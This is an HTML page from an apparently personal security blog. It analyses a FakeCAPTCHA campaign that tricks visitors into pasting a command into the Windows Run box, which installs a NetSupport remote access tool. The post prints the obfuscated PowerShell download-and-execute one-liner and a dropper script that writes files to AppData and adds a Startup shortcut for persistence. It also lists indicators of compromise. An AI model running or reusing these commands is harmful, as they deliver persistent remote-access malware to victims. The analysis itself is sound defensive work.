@@ -1,0 +1,489 @@
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Attack Chain Investigation: FakeCAPTCHA to RAT Install</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="preload" href="../assets/css/app.css?v=b439e5b254" as="style">
+    <link rel="preload" href="../assets/js/manifest.js?v=b439e5b254" as="script">
+    <link rel="preload" href="../assets/js/vendor.js?v=b439e5b254" as="script">
+    <link rel="preload" href="../assets/js/app.js?v=b439e5b254" as="script">
+
+      <link rel="preload" href="../assets/css/post.css?v=b439e5b254" as="style">
+  <link rel="preload" href="../assets/js/post.js?v=b439e5b254" as="script">
+
+
+    <style>
+      /* These font-faces are here to make fonts work if the Ghost instance is installed in a subdirectory */
+
+      /* source-sans-pro-regular */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 400;
+        font-display: swap;
+        src: local('SourceSansPro-Regular'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-regular.woff2?v=b439e5b254") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-regular.woff?v=b439e5b254") format('woff');
+      }
+
+      /* source-sans-pro-600 */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 600;
+        font-display: swap;
+        src: local('SourceSansPro-SemiBold'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-600.woff2?v=b439e5b254") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-600.woff?v=b439e5b254") format('woff');
+      }
+
+      /* source-sans-pro-700 */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 700;
+        font-display: swap;
+        src: local('SourceSansPro-Bold'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-700.woff2?v=b439e5b254") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-700.woff?v=b439e5b254") format('woff');
+      }
+
+      /* iconmoon */
+      @font-face {
+        font-family: 'icomoon';
+        font-weight: normal;
+        font-style: normal;
+        font-display: swap;
+        src: url("../assets/fonts/icomoon/icomoon.eot?101fc3?v=b439e5b254");
+        src: url("../assets/fonts/icomoon/icomoon.eot?101fc3?v=b439e5b254") format('embedded-opentype'),
+        url("../assets/fonts/icomoon/icomoon.ttf?101fc3?v=b439e5b254") format('truetype'),
+        url("../assets/fonts/icomoon/icomoon.woff?101fc3?v=b439e5b254") format('woff'),
+        url("../assets/fonts/icomoon/icomoon.svg?101fc3?v=b439e5b254") format('svg');
+      }
+    </style>
+
+    <link rel="stylesheet" type="text/css" href="../assets/css/app.css?v=b439e5b254" media="screen">
+
+      <link rel="stylesheet" type="text/css" href="../assets/css/post.css?v=b439e5b254" media="screen">
+
+
+    
+
+    <link rel="canonical" href="index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Systems, Software and Security">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Attack Chain Investigation: FakeCAPTCHA to RAT Install">
+    <meta property="og:description" content="Providing &quot;Proof of Humanity&quot;
+
+With the increase of DeepFakes and AI Chatbots being used to mimic human interactions, identifying actual people is becoming more important in all areas of the web. There are many different approaches to this: from Sam Altman's World ID which uses &quot;The Orb&quot; to capture and">
+    <meta property="og:url" content="simon-kruik.github.io//attack-chain-investigation-fakecaptcha-to-rat-install/">
+    <meta property="og:image" content="simon-kruik.github.io//content/images/2025/06/FakeCAPTCHA_AttackChain.drawio-1.png">
+    <meta property="article:published_time" content="2025-06-29T16:57:34.000Z">
+    <meta property="article:modified_time" content="2025-06-29T16:57:34.000Z">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Attack Chain Investigation: FakeCAPTCHA to RAT Install">
+    <meta name="twitter:description" content="Providing &quot;Proof of Humanity&quot;
+
+With the increase of DeepFakes and AI Chatbots being used to mimic human interactions, identifying actual people is becoming more important in all areas of the web. There are many different approaches to this: from Sam Altman's World ID which uses &quot;The Orb&quot; to capture and">
+    <meta name="twitter:url" content="simon-kruik.github.io//attack-chain-investigation-fakecaptcha-to-rat-install/">
+    <meta name="twitter:image" content="simon-kruik.github.io//content/images/2025/06/FakeCAPTCHA_AttackChain.drawio-1.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Simon Kruik">
+    <meta property="og:image:width" content="770">
+    <meta property="og:image:height" content="445">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Systems, Software and Security",
+        "url": "simon-kruik.github.io//",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "simon-kruik.github.io//favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Simon Kruik",
+        "image": {
+            "@type": "ImageObject",
+            "url": "simon-kruik.github.io//content/images/2025/06/C037251-R1-16-16-1-1.jpg",
+            "width": 1107,
+            "height": 1075
+        },
+        "url": "simon-kruik.github.io//author/simon/",
+        "sameAs": []
+    },
+    "headline": "Attack Chain Investigation: FakeCAPTCHA to RAT Install",
+    "url": "simon-kruik.github.io//attack-chain-investigation-fakecaptcha-to-rat-install/",
+    "datePublished": "2025-06-29T16:57:34.000Z",
+    "dateModified": "2025-06-29T16:57:34.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "simon-kruik.github.io//content/images/2025/06/FakeCAPTCHA_AttackChain.drawio-1.png",
+        "width": 770,
+        "height": 445
+    },
+    "description": "Providing &quot;Proof of Humanity&quot;\n\nWith the increase of DeepFakes and AI Chatbots being used to mimic human interactions, identifying actual people is becoming more important in all areas of the web. There are many different approaches to this: from Sam Altman&#x27;s World ID which uses &quot;The Orb&quot; to capture and verify biometrics, to commercial offerings like ID.me which rely on user submission of government-issued IDs, but maybe the most commonly encountered across a variety of services is the humble CAP",
+    "mainEntityOfPage": "simon-kruik.github.io//attack-chain-investigation-fakecaptcha-to-rat-install/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.125">
+    <link rel="alternate" type="application/rss+xml" title="Systems, Software and Security" href="../rss/index.html">
+    
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/sodo-search.min.js" data-key="134e2445460c1bea8b41643d3f" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/main.css" data-sodo-search="simon-kruik.github.io//" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="simon-kruik.github.io//webmentions/receive/" rel="webmention">
+    <script defer src="../public/cards.min.js?v=b439e5b254"></script><style>:root {--ghost-accent-color: #ff9119;}</style>
+    <link rel="stylesheet" type="text/css" href="../public/cards.min.css?v=b439e5b254">
+    <style>
+[data-theme="light"] {
+  --background-color: #111;
+  --primary-foreground-color: #ccc;
+  --secondary-foreground-color: #fff;
+  --primary-subtle-color: #2c2fe6;
+  --secondary-subtle-color: #141920;
+  --titles-color: #b4b4b4;
+  --link-color: #b6b7f6;
+  --primary-border-color: #1d1d1d;
+  --secondary-border-color: #0f0f0f;
+  --article-shadow-normal: 0 4px 5px 5px rgba(0, 0, 0, 0.1);
+  --article-shadow-hover: 0 4px 5px 10px rgba(0, 0, 0, 0.1);
+  --transparent-background-color: rgba(0, 0, 0, 0.99);
+  --footer-background-color: #080808;
+  --submenu-shadow-color-opacity: 0.55;
+  --button-shadow-color-normal: rgba(10, 10, 10, 0.5);
+  --button-shadow-color-hover: rgba(10, 10, 10, 0.5);
+  --table-background-color-odd: #050505;
+  --table-head-border-bottom: #1d1d1d;
+  --toggle-darkmode-button-display-moon: none;
+  --toggle-darkmode-button-display-sun: block;
+  --toggle-darkmode-background-color: rgba(0, 0, 0, 0.5);
+  --header-menu-gradient-first-color: rgba(17, 17, 17, 0);
+  --header-menu-gradient-second-color: rgba(17, 17, 17, 0.65);
+  --kg-card-img-invert-color: 1;
+}
+
+[data-theme="dark"] {
+   --background-color: #fff;
+  --primary-foreground-color: #4a4a4a;
+  --secondary-foreground-color: #000;
+  --primary-subtle-color: #0470ee;
+  --secondary-subtle-color: #f4f8fd;
+  --titles-color: #333;
+  --link-color: #133467;
+  --primary-border-color: #9b9b9b;
+  --secondary-border-color: aliceblue;
+  --article-shadow-normal: 0 10px 10px rgba(0, 0, 0, 0.08);
+  --article-shadow-hover: 0 4px 60px 0 rgba(0, 0, 0, 0.2);
+  --transparent-background-color: rgba(255, 255, 255, 0.99);
+  --footer-background-color: #133467;
+  --submenu-shadow-color-opacity: 0.25;
+  --button-shadow-color-normal: rgba(108, 108, 108, 0.2);
+  --button-shadow-color-hover: rgba(108, 108, 108, 0.3);
+  --table-background-color-odd: #fafafa;
+  --table-head-border-bottom: #e2e2e2;
+  --toggle-darkmode-button-display-moon: block;
+  --toggle-darkmode-button-display-sun: none;
+  --toggle-darkmode-background-color: rgba(0, 0, 0, 0.05);
+  --header-menu-gradient-first-color: rgba(255, 255, 255, 0);
+  --header-menu-gradient-second-color: rgba(255, 255, 255, 1);
+  --kg-card-img-invert-color: 0;
+}
+</style>
+
+    <style>
+      :root {
+        --primary-subtle-color: var(--ghost-accent-color) !important;
+      }
+    </style>
+
+    <script>
+      // @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&dn=expat.txt Expat
+      const ghostHost = "simon-kruik.github.io/"
+      // @license-end
+    </script>
+
+
+
+
+    <script>
+      if (typeof Storage !== 'undefined') {
+        const currentSavedTheme = localStorage.getItem('theme')
+
+        if (currentSavedTheme && currentSavedTheme === 'dark') {
+          document.documentElement.setAttribute('data-theme', 'dark')
+        } else {
+          document.documentElement.setAttribute('data-theme', 'light')
+        }
+      }
+    </script>
+  </head>
+  <body class="post-template">
+    
+
+
+
+  
+<header class="m-header with-picture js-header" data-animate="fade-down">
+  <div class="m-mobile-topbar">
+    <button class="m-icon-button in-mobile-topbar js-open-menu" aria-label="Open menu">
+      <span class="icon-menu" aria-hidden="true"></span>
+    </button>
+      <a href="../" class="m-site-name in-mobile-topbar">
+        Systems, Software and Security
+      </a>
+    <button class="m-icon-button in-mobile-topbar js-open-search" aria-label="Open search">
+      <span class="icon-search" aria-hidden="true"></span>
+    </button>
+  </div>
+
+  <div class="m-menu js-menu">
+    <button class="m-icon-button outlined as-close-menu js-close-menu" aria-label="Close menu">
+      <span class="icon-close"></span>
+    </button>
+    <div class="m-menu__main">
+      <div class="l-wrapper">
+        <div class="m-nav js-main-nav">
+          <nav class="m-nav__left js-main-nav-left" role="navigation" aria-label="Main menu">
+            <ul>
+                <li class="only-desktop">
+                  <a href="../" class="m-site-name in-desktop-menu">
+                    Systems, Software and Security
+                  </a>
+                </li>
+                
+    <li class="nav-home">
+      <a href="../">Home</a>
+    </li>
+    <li class="nav-author">
+      <a href="../author/simon/">Author</a>
+    </li>
+
+                <li class="more">
+                  <span>
+                    <a href="javascript:void(0);" class="js-open-secondary-menu">
+                      More
+                      <span class="icon-chevron-down" aria-hidden="true"></span>
+                    </a>
+                  </span>
+                </li>
+              <li class="submenu-option js-submenu-option">
+                <button class="m-icon-button in-menu-main more js-toggle-submenu" aria-label="Open submenu">
+                  <span class="icon-more" aria-hidden="true"></span>
+                </button>
+                <div class="m-submenu js-submenu">
+                  <div class="l-wrapper in-submenu">
+                    <section class="m-recent-articles">
+                      <h3 class="m-submenu-title in-recent-articles">Recent articles</h3>
+                          <div class="swiper js-recent-slider">
+                            <div class="swiper-wrapper">
+                                <div class="swiper-slide">
+                                  <a href="index.html" class="m-recent-article">
+                                    <div class="m-recent-article__picture ">
+                                        <img src="../content/images/size/w300/2025/06/FakeCAPTCHA_AttackChain.drawio-1.png" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="Attack Chain Investigation: FakeCAPTCHA to RAT Install">
+                                      Attack Chain Investigation: FakeCAPTCHA to RAT Install
+                                    </h3>
+                                    <span class="m-recent-article__date">35 minutes ago</span>
+                                  </a>
+                                </div>
+                                <div class="swiper-slide">
+                                  <a href="../setting-up-a-blog-using-ghost-and-github-pages/" class="m-recent-article">
+                                    <div class="m-recent-article__picture no-picture">
+                                        <img src="../assets/images/no-image.png?v=b439e5b254" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="Setting up a blog using Ghost and GitHub Pages">
+                                      Setting up a blog using Ghost and GitHub Pages
+                                    </h3>
+                                    <span class="m-recent-article__date">5 years ago</span>
+                                  </a>
+                                </div>
+                            </div>
+                          </div>
+                    </section>
+                    <section class="m-tags">
+                      <h3 class="m-submenu-title">Tags</h3>
+                        <ul>
+                            <li>
+                              <a href="../tag/systems/">systems</a>
+                            </li>
+                        </ul>
+                    </section>
+                  </div>
+                </div>
+              </li>
+            </ul>
+          </nav>
+          <div class="m-nav__right">
+            <button class="m-icon-button in-menu-main js-open-search" aria-label="Open search">
+              <span class="icon-search" aria-hidden="true"></span>
+            </button>
+            <div class="m-toggle-darkmode js-tooltip" data-tippy-content="Toggle light/dark mode" tabindex="0">
+              <label for="toggle-darkmode" class="sr-only">
+                Toggle light/dark mode
+              </label>
+              <input id="toggle-darkmode" type="checkbox" class="js-toggle-darkmode">
+              <div>
+                <span class="icon-moon moon" aria-hidden="true"></span>
+                <span class="icon-sunny sun" aria-hidden="true"></span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+    <div id="secondary-navigation-template" style="display: none;">
+      
+  <ul class="m-secondary-menu">
+      <li class="nav-sign-up">
+        <a href="index.html#/portal/">Sign up</a>
+      </li>
+  </ul>
+
+    </div>
+</header>
+
+<main class="main-wrap">
+    
+  <section class="m-hero with-picture" data-animate="fade">
+    <div class="m-hero__picture in-post">
+      <img srcset="../content/images/size/w300/2025/06/FakeCAPTCHA_AttackChain.drawio-1.pngrawio-1.png 300w../content/images/size/w600/2025/06/FakeCAPTCHA_AttackChain.drawio-1.pngdrawio-1.png 600../content/images/size/w1000/2025/06/FakeCAPTCHA_AttackChain.drawio-1.png.drawio-1.png 100../content/images/size/w2000/2025/06/FakeCAPTCHA_AttackChain.drawio-1.pngn.drawio-1.png 2000w
+        " sizes="(max-width: 600px) 600px, (max-width: 1000px) 1000px, 2000px" src="../content/images/size/w1000/2025/06/FakeCAPTCHA_AttackChain.drawio-1.png" alt="">
+    </div>
+    </section>
+        <div class="l-wrapper in-caption">
+          <p class="m-small-text align-center">
+            <span style="white-space: pre-wrap;">The Attack Chain</span>
+          </p>
+        </div>
+  
+  <article>
+    <div class="l-content in-post">
+        <div class="l-wrapper in-post  js-animation-wrapper" data-animate="fade-up">
+          <div class="l-post-content js-progress-content">
+            <header class="m-heading">
+              <h1 class="m-heading__title in-post">Attack Chain Investigation: FakeCAPTCHA to RAT Install</h1>
+              <div class="m-heading__meta">
+                <span class="m-heading__meta__time">Jun 30, 2025</span>
+              </div>
+            </header>
+            <div class="pos-relative js-post-content">
+              <div class="m-share">
+                <div class="m-share__content js-sticky">
+                  <a href="https://www.facebook.com/sharer/sharer.php?u=simon-kruik.github.io//attack-chain-investigation-fakecaptcha-to-rat-install/" class="m-icon-button filled in-share" target="_blank" rel="noopener" aria-label="Facebook">
+                    <span class="icon-facebook" aria-hidden="true"></span>
+                  </a>
+                  <a href="https://twitter.com/intent/tweet?text=Attack%20Chain%20Investigation%3A%20FakeCAPTCHA%20to%20RAT%20Install&amp;url=simon-kruik.github.io//attack-chain-investigation-fakecaptcha-to-rat-install/" class="m-icon-button filled in-share" target="_blank" rel="noopener" aria-label="Twitter">
+                    <span class="icon-twitter" aria-hidden="true"></span>
+                  </a>
+                  <button class="m-icon-button filled in-share progress js-scrolltop" aria-label="Scroll to top">
+                    <span class="icon-arrow-top" aria-hidden="true"></span>
+                    <svg aria-hidden="true">
+                      <circle class="progress-ring__circle js-progress" fill="transparent" r="0"></circle>
+                    </svg>
+                  </button>
+                </div>
+              </div>
+              <h2 id="providing-proof-of-humanity">Providing "Proof of Humanity"</h2><p>With the increase of DeepFakes and AI Chatbots being used to mimic human interactions, identifying actual people is becoming more important in all areas of the web. There are many different approaches to this: from Sam Altman's <a href="https://world.org/world-id?ref=localhost" rel="noreferrer">World ID</a> which uses "The Orb" to capture and verify biometrics, to commercial offerings like <a href="https://en.wikipedia.org/wiki/ID.me?ref=localhost" rel="noreferrer">ID.me</a> which rely on user submission of government-issued IDs, but maybe the most commonly encountered across a variety of services is the humble <strong>CAPTCHA </strong>(<strong>C</strong>ompletely <strong>A</strong>utomated <strong>P</strong>ublic <strong>T</strong>uring Test to tell <strong>C</strong>omputers and <strong>H</strong>umans <strong>A</strong>part).</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2025/06/image.png" class="kg-image" alt="" loading="lazy" width="582" height="144"><figcaption><span style="white-space: pre-wrap;">An example of the "CAPTCHA" box on the infected site</span></figcaption></figure><p>These generally start with a simple checkbox, but will then sometimes prompt human verification via correctly identifying distorted letters, transcribing audio or completing a series of image identification challenges (with often frustratingly vague criteria). But what happens when this common and benign 'human verification task' is altered and weaponised by a threat actor?</p><h2 id="the-pledge1-just-one-extra-step">The Pledge<sup>[1]</sup>: <em>Just one extra step...</em></h2><p>The 'FakeCAPTCHA' launches<sup>[2]</sup> as soon as you hit any page on a compromised web server (and in fact overlays the original webpage which still loads, presumably to help minimise any obvious changes in visitor traffic to the original site). However after clicking the checkbox, an error pops up:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2025/06/image-1.png" class="kg-image" alt="" loading="lazy" width="928" height="456" srcset="../content/images/size/w600/2025/06/image-1.png 600w, ../content/images/2025/06/image-1.png 928w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">The error message, instructing 'legitimate users' to paste a code into the Run tool</span></figcaption></figure><p>This sentence "Unusual Web Traffic Detected" occurs legitimately for those who browse the web with a VPN connected, or use TOR, as it is often due to your device sharing an IP address with automated tools, bots or scrapers. This extra step however deviates from the norm - in both this and other observed examples it presents instructions to verify your identity using an inbuilt tool in Windows and send a code. This pattern is familiar to those used to using a one-time code ("nonce") for use in multi-factor authentication systems, password resets, or email verification. This mix and match of existing and novel components helps ensure the victim might be convinced that this request is a new version of previously seen CAPTCHAs. </p><h2 id="the-turn-not-what-it-says-on-the-tin">The Turn: <em>Not what it says on the tin</em></h2><p>The first malicious behaviour we see is the "Copy" button on the verification code section. While it looks equivalent to many other technical documentation sites which have the same function, it actually decodes a base64 string and places that in your clipboard instead.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2025/06/image-2.png" class="kg-image" alt="" loading="lazy" width="385" height="136"><figcaption><span style="white-space: pre-wrap;">Clipboard history displaying the actual effect of the Copy button</span></figcaption></figure><p>The string is a little bit obfuscated as you can see here:</p><pre><code>powershell -w h -nop -c "$e=(@(104,116,116,112,115,58,47,47,118,101,114,105,102,105,110,116,99,111,110,46,99,111,109,47,49,46,116,120,116)|%{[char]$_})-join'';$y=New-Object Net.WebClient;$u=$y.('DownloadStri'+'ng')($e);$i='i'+'e'+'x';&amp;$i $u"
+</code></pre><p>Put simply, this command downloads a file from the URL  (made up of the ASCII codes above) <em>https:// verifintcon [.] com/1.txt </em>and executes it in a hidden Powershell window without a profile (meaning no custom scripts). So, let's look at the contents of the downloaded Powershell file:</p><blockquote>$ErrorActionPreference='Stop';$ojftLp='eyJwYXRocyI6WyJBdWRpb0NhcHR1cmUuZGxsIiwiY2...&lt;9,714,825 characters&gt;...GVEaGNxTHFBQUFBQUE9PSJdfQ=='==';$ptCuIqwFE=[System.Text.Encoding]::UTF8.GetString([System.Convert]::<strong>FromBase64String</strong>($ojftLp));$hNHwwvpT=<strong>ConvertFrom-Json </strong>$ptCuIqwFE;$wBZiLfRoT=<strong>Join-Path $env:AppData 'FZlhFAy</strong>';[IO.Directory]::CreateDirectory($wBZiLfRoT)|Out-Null;for($lTkdkWq=0;$lTkdkWq -lt $hNHwwvpT.paths.Count;$lTkdkWq++){$eKCEjGQgX=$hNHwwvpT.paths[$lTkdkWq];$LKMlDIY=[System.Convert]::FromBase64String($hNHwwvpT.data[$lTkdkWq]);$MRQZHFLA=Join-Path $wBZiLfRoT $eKCEjGQgX;$tyXPYtKPrf=[System.IO.Path]::GetDirectoryName($MRQZHFLA);if(-not(Test-Path $tyXPYtKPrf)){New-Item -Type Directory -Path $tyXPYtKPrf|Out-Null}[System.IO.File]::<strong>WriteAllBytes</strong>($MRQZHFLA,$LKMlDIY);}$oxyNFIQQ=New-Object -ComObject WScript.Shell;$fgWVKoq=$oxyNFIQQ.<strong>CreateShortcut</strong>((Join-Path $wBZiLfRoT 'RuivQswX.lnk'));$fgWVKoq.TargetPath=Join-Path $wBZiLfRoT 'client32.exe';$fgWVKoq.WorkingDirectory=$wBZiLfRoT;$fgWVKoq.WindowStyle=7;$fgWVKoq.Save();$acZpyja=Join-Path ($<strong>env:APPDATA+'\Microsoft\Windows\Start Menu\Programs\Startup</strong>') 'RuivQswX.lnk';$olnNnlh=$oxyNFIQQ.CreateShortcut($acZpyja);$olnNnlh.TargetPath=Join-Path $wBZiLfRoT 'client32.exe';$olnNnlh.WorkingDirectory=$wBZiLfRoT;$olnNnlh.WindowStyle=7;$olnNnlh.Save();<strong>Start-Sleep -Seconds 3;Invoke-Expression ('cmd /c rundll32.exe shell32.dll,ShellExec_RunDLL "'+$acZpyja+'"');Write-Host 'Done'</strong></blockquote><p>There's a lot of it, and both the data and variable names are clearly obfuscated, this time the data is base64 encoding of a JSON file which decoded has this first line:</p><blockquote>{"paths":["AudioCapture.dll","client32.exe","client32.ini","HTCTL32.DLL",<br>"msvcr100.dll","nskbfltr.inf","NSM.LIC","nsm_vpro.ini","pcicapi.dll",<br>"PCICHEK.DLL","PCICL32.DLL","remcmdstub.exe","TCCTL32.DLL"],<br>"data":["TVqQAAMAAAAEAAAA//8AA...</blockquote><p>Clearly a list of filenames, followed by an array of data to put into them. That helps us understand the context of the powershell command - following the sections in bold - it:</p><ol><li>Decodes the data from Base64</li><li>Converts it from JSON into a Powershell object</li><li>Adds to the file paths the local AppData folder and sub-folder <code>FZlhFAy</code></li><li>Writes the bytes of the files to said folder</li><li>Creates a shortcut to the "client32.exe" application</li><li>Puts the shortcut in the Windows Startup folder for persistence</li><li>Waits 3 seconds, and then runs the shortcut and writes "Done"</li></ol><p>Two things that are worth noting here:</p><ul><li>None of this code is unique to the request of the original website, and none of it appears to communicate back to said webpage, so the original user is stuck with the FakeCAPTCHA unfulfilled and the webpage still inaccessible - something that may arouse suspicion. Unlike more complex trojans, this doesn't achieve it's stated purpose in addition to staging a further tool.</li><li>In the JSON file's paths array, we clearly see "NSM.lic" which is a NetSupport License file, and it's contents show the NSM Serial Number <code>NSM212937</code>. This is a well-known Remote Access Tool (RAT) that can be used to exfiltrate existing data, pivot to other devices on the network or monitor steal passwords/secrets pasted to the clipboard.</li></ul><h2 id="the-prestige-wrapping-it-up">The Prestige: <em>Wrapping it up</em></h2><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2025/06/FakeCAPTCHA_AttackChain.drawio.png" class="kg-image" alt="" loading="lazy" width="770" height="445" srcset="../content/images/size/w600/2025/06/FakeCAPTCHA_AttackChain.drawio.png 600w, ../content/images/2025/06/FakeCAPTCHA_AttackChain.drawio.png 770w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Attack Chain Diagram </span></figcaption></figure><p>The nature of the RAT is such that it can be utilised for a variety of malicious purposes meaning there's not an obvious behaviour to detect. There are however, a variety of indicators that can be reported and monitored.</p><p>Indicators of Compromise (IOCs):</p><ul><li>Traffic contacting <code>thankyoumykio [.] com:443</code>, <code>deepholeintheworld [.] com:443</code>, and <code>83.222.190.174</code> - all used for communication to/from the RAT. These sites may be compromised sites or originals, and are hosted by the network provider SS-Net in Bulgaria. A copy of these findings and a takedown request was sent to the provider.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2025/06/image-3.png" class="kg-image" alt="" loading="lazy" width="629" height="268" srcset="../content/images/size/w600/2025/06/image-3.png 600w, ../content/images/2025/06/image-3.png 629w"><figcaption><span style="white-space: pre-wrap;">The NetSupport Config File showing the above IOCs</span></figcaption></figure><ul><li>A powershell download from <code>https:// verifintcon [.] com/1.txt</code>, the obfuscated data file. This seems to be the front-end for (ironically) a Cloudflare R2 public bucket hosting the file. This was reported to Cloudflare's Abuse team, and via their bug bounty program, however since the original site didn't fall under their scope, and it "does not pose a concrete and exploitable risk" they refused to take any action. 🦶🔫☁️<sup>[3]</sup></li><li>NetSupport Manager is relatively well-known for it's use as a malicious RAT, and their support was very helpful in confirming that this installation is using a outdated cracked version. Any legitimate version would be updated and with a different configuration, therefore an indicator is finding files in:<ul><li><code>AppData\Roaming\FZlhFAy</code> with the following MD5 hashes:<ul><li>client32.exe: <code>290c26b1579fd3e48d60181a2d22a287</code></li><li>client32.ini: <code>6fb2724011abc37646ac6288faa8e9bf</code></li></ul></li><li>A shortcut in <code>AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> with this MD5 hash<ul><ul><li>RuivQswX.lnk: <code>38c6cab1de02c1918bf0e1f77c0c2c3d</code></li><li>Notably, even if an existing Anti-Virus detects and quarantines the NetSupport Manager application (.exe), this shortcut will likely remain and provide evidence that the phishing attempt was successful.</li></ul></ul></li></ul></li><li>One of the things I have been unable to find is a good indicator for compromised servers on which this FakeCAPTCHA is being deployed - this could potentially be used in tools like the Shodan Search Engine to find other compromised servers and notify the owners. As it is, one other compromised server was found from the original, and both server owners were contacted and informed of the issue.</li></ul><p>Given the relative simplicity of the attack chain, the ubiquity of CAPTCHAs and other interruptive dialogues (paywalls, cookies settings panels, etc.) and the lack of concern by the major parties involved, I can only expect we'll see more attacks like this in the future. Like most phishing attacks, the strongest defence is training users - in this case, to set good boundaries/expectations about what behaviour a website should ask of you, something both technical and non-technical staff alike can be prepared for.</p><h3 id="footnotes">Footnotes</h3><p>[1] These heading prefixes are taken from the elements of a magic illusion described in The Prestige</p><p>[2] The page presented for the FakeCAPTCHA is actually quite interesting - it uses a lot of static assets, presumably to not alert the website it's impersonating, but generates a new 'unique id' at the bottom of the page each time, and up until the extra step has no obvious grammar or graphical errors to tell it apart from a standard CAPTCHA<br><br>[3] Emoji Translation: Cloudflare shooting themselves in the foot.</p>
+            </div>
+          </div>
+        </div>
+        <section class="m-author">
+          <div class="m-author__content">
+            <div class="m-author__picture">
+              <a href="../author/simon/" class="m-author-picture" aria-label="Simon Kruik">
+                  <div style="background-image: url(../content/images/2025/06/C037251-R1-16-16-1-1.jpg);"></div>
+              </a>
+            </div>
+            <div class="m-author__info">
+              <h4 class="m-author__name">
+                <a href="../author/simon/">Simon Kruik</a>
+              </h4>
+                <p class="m-author__bio">A travelling IT professional with a home lab, interested in Linux administration, automation and scalability. </p>
+              <ul class="m-author-links">
+              </ul>
+            </div>
+          </div>
+        </section>
+    </div>
+  </article>
+</main>
+
+
+
+      
+<div class="m-search js-search" role="dialog" aria-modal="true" aria-label="Search">
+  <button class="m-icon-button outlined as-close-search js-close-search" aria-label="Close search">
+    <span class="icon-close" aria-hidden="true"></span>
+  </button>
+  <div class="m-search__content">
+    <form class="m-search__form">
+      <div class="pos-relative">
+        <span class="icon-search m-search-icon" aria-hidden="true"></span>
+        <label for="search-input" class="sr-only">
+          Type to search
+        </label>
+        <input id="search-input" type="text" class="m-input in-search js-input-search" placeholder="Type to search">
+      </div>
+    </form>
+    <div class="js-search-results hide"></div>
+    <p class="m-not-found align-center hide js-no-results">
+      No results for your search, please try with something else.
+    </p>
+  </div>
+</div>
+
+    
+<footer class="m-footer">
+  <div class="m-footer__content">
+      <nav class="m-footer__nav-secondary" role="navigation" aria-label="Secondary menu in footer">
+        
+  <ul class="m-secondary-menu">
+      <li class="nav-sign-up">
+        <a href="index.html#/portal/">Sign up</a>
+      </li>
+  </ul>
+
+      </nav>
+    <nav class="m-footer-social">
+      <a href="simon-kruik.github.io//rss" aria-label="RSS">
+        <span class="icon-rss" aria-hidden="true"></span>
+      </a>
+    </nav>
+    <p class="m-footer-copyright">
+      <span>Systems, Software and Security © 2025</span>
+      <span>  •  </span>
+      <span>Published with <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a></span>
+    </p>
+    <p class="m-footer-copyright jslicense">
+      <a href="../assets/html/javascript.html?v=b439e5b254" rel="jslicense">JavaScript license information</a>
+    </p>
+  </div>
+</footer>
+
+    <script defer src="../assets/js/manifest.js?v=b439e5b254"></script>
+    <script defer src="../assets/js/vendor.js?v=b439e5b254"></script>
+    <script defer src="../assets/js/app.js?v=b439e5b254"></script>
+
+      <script defer src="../assets/js/post.js?v=b439e5b254"></script>
+
+
+    
+  </body>
